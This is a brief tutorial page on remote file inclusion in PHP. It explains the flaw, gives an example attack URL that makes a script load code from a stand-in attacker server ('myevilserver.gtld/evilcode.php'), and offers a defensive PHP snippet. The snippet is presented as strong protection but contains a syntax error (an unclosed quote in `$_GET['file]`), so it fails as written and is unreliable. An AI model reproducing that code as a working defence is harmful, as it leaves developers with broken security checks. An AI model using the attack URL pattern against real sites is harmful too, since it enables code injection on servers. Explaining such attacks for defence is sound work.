---
title: Remote File Inclusion
---
## Remote File Inclusion

A vulnerability in the application caused by the programmer requiring a file input provided by the user and not sanitizing the input before accessing the requested file. This results in a file being pulled from a remote server and included where it should not of been.

### Example remote file inclusion attacks
A website allows you to view PDFs as `download.php?file=myfile.php`, due to a lack of proper checking a malicious user is able to request a remote resource and include in the script. The URL could become `download.php?file=http://myevilserver.gtld/evilcode.php` this could then be outputted to the user or in severe cases run the actual PHP code on your server.

### Defending your website from remote file inclusion attacks in PHP
The following PHP code will provide strong protection against a remote file inclusion attacks
```PHP
<?php
if(basename($_GET['file]) !== $_GET['file']) {
  die('INVALID FILE REQUESTED');
}
```
* You can disable `allow_url_fopen` in your php.ini file as an added protection against remote file inclusion.

#### More Information:
* <a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion" rel="nofollow">OWASP Wiki - Testing for Remote File Inclusion</a>
